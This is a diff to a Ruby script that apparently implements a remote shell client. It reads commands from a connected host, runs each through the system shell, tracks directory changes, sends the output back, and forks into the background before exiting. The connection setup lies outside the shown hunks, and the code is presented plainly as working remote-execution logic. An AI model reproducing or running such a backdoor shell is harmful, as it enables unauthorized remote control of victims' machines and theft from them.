@@ -25,7 +25,7 @@ rescue
 	joiner = "\& "
 end
 host.puts currentDirCommand
-
+$currentDir = ""
 fork do
 	loop do
 		cmd = host.gets.chomp
@@ -35,20 +35,16 @@ fork do
 		else
 			begin
 				if cmd.split(" ")[0].downcase == "cd" && cmd.split(" ")[1]
-					currentDir = `cd "#{currentDir}"#{joiner}#{cmd}#{joiner}#{currentDirCommand}`.chomp
-					out = ""
+					$currentDir = `cd "#{$currentDir}"#{joiner}#{cmd}#{joiner}#{currentDirCommand}`.chomp
+					out = "Changed Directory\n"
 				else
-					out = `cd "#{currentDir}"#{joiner}#{cmd.chomp}`
+					out = `cd "#{$currentDir}"#{joiner}#{cmd.chomp}`
 				end
 			rescue
-				out = "Unable to execute command"
+				out = "Unable to execute command\n"
 			end
 			host.puts out.gsub("\n", "\\NEWLINE")
 		end
 	end
 end
-
-
-
-
-# Process.detach(pid)
+exit
